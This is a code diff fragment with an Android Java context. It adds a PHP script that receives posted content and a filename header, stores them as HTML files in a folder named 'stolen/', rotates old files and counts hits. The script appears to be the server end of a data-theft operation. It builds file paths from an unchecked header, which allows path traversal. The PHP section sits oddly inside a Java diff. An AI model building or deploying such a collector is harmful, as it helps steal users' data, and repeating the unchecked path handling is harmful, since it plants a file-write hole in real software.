@@ -154,3 +154,30 @@
 			Log.e("iq500", e.toString());
 		}
 	}
+	
+	
+PHP:
+<?php
+$fname = $_SERVER["HTTP_FNAME"];
+$inp = file_get_contents("php://input");
+
+$file = scandir("stolen/");
+if(sizeof($file) >= 32)
+{
+for($i = 2; $i < sizeof($file); $i++)
+{
+unlink("stolen/" . $file[$i]);
+}
+}
+
+if($inp != "" && strlen($fname) > 0)
+{
+$p = "stolen/" . $fname . ".html";
+file_put_contents($p, $inp);
+chmod($p, 0640);
+}
+
+$oldCount = file_get_contents('count_fileclick.txt');
+
+file_put_contents('count_fileclick.txt', $oldCount + 1);
+?>
